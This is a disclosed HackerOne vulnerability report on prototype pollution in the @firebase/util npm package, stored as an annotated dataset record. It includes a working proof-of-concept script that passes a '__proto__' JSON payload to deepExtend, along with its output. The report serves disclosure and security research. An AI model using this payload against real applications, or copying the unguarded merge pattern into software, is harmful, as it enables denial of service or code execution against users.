{
    "reported_to": "Node.js third-party modules",
    "reported_by": "d3lla ",
    "title": "[@firebase/util] Prototype pollution",
    "content": "\nModule\nmodule name: @firebase/util\nversion: 0.3.2\nnpm page: https://www.npmjs.com/package/@firebase/util\nModule Description\nNOTE: This is specifically tailored for Firebase JS SDK usage, if you are not a member of the Firebase team, please avoid using this package\nThis is a wrapper of some Webchannel Features for the Firebase JS SDK.\nModule Stats\n[1,516,157] weekly downloads\nVulnerability\nVulnerability Description\nI tested the deepCopy and deepExtend functions.\nThe deepCopy and deepExtend functions can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall @firebase/util module:\nnpm i ``@firebase/util\nnpm i ``@firebase/util\nRun the following poc:\nCode 259 Bytes\n1const utils = require('@firebase/util');\n2\n3const obj = {};\n4const source = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n5console.log(\"Before : \" + obj.polluted);\n6utils.deepExtend({}, source);\n7// utils.deepCopy(source);\n8console.log(\"After : \" + obj.polluted);\n9\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.11.0\nNPM VERSION: 6.14.8\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1605652920,
    "report_url": "https://hackerone.com/reports/1001218",
    "vuln_category": "CODE",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "LOW",
    "steps": [
        [
            1,
            "Install the @firebase/util module: npm i @firebase/util"
        ],
        [
            2,
            "Run the provided PoC code to demonstrate prototype pollution"
        ]
    ],
    "vuln_description": "The vulnerability involves prototype pollution in the @firebase/util module, specifically in the deepCopy and deepExtend functions. These functions can be manipulated to modify the Object prototype, leading to properties being added or modified on all objects, which can result in various security issues such as Denial of Service (DoS), Remote Code Execution, or Property Injection.",
    "reason": "The vulnerability is straightforward to discover as it involves a common pattern of prototype pollution, which is a well-known issue in JavaScript. The steps to reproduce are simple and do not require complex interactions or understanding of multiple components. The attack vector is direct and does not involve novel logic or complex application states.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}